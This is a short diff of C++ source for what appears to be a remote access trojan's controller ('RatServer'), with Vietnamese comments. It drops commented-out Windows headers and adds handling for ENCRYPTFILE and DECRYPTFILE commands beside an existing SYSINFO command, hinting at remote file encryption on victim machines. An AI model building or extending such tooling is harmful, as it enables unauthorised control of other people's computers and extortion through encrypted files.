@@ -7,12 +7,8 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
-// #include <winsock2.h>
-// #include <ws2tcpip.h>
 #include <fstream>
 #include <string>
-// #include <windows.h>
-// #include <io.h>
 #include <vector>
 #include <cstdint>
 #include <filesystem>
@@ -320,6 +316,10 @@ void RatServer::HandleCommand(const std::string& input) {
     
     else if (input == "SYSINFO") { // Thêm nhánh xử lý phản hồi lệnh SYSINFO
         SysInfo();
+    }
+
+    else if (input.rfind("ENCRYPTFILE ", 0) == 0 || input.rfind("DECRYPTFILE ", 0) == 0) {
+        ReceiveStatus();
     }
 }
 
